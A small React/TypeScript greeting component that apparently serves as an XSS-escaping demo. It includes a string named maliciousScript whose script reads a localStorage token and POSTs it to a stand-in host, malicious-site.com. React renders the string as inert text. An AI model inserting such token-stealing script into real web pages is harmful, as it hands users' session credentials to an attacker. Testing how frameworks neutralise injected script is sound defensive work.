export default function hello() {
  const name: string = "Lucienie";
  
  const title = <h1>Hello, {name}</h1>
  const maliciousScript = `
  <script>
    const token = window.localStorage.getItem('token');
    fetch('https://malicious-site.com/get-token', {
      method: 'POST',
      body: { token }
    })
    console.log('sent')
  </script>
`



  if (name === "Lu") {
    return (
      <div>
        <h1 style={{ color: "green" }}>Hello, {name}</h1>
      </div>
    );
  }
  return (
    <div>
      {maliciousScript}
      <h1  tabIndex={0} >Hello, {name === "Luciene" ? "Luuu" : "Lucy"}! </h1>
    </div>
  );
}
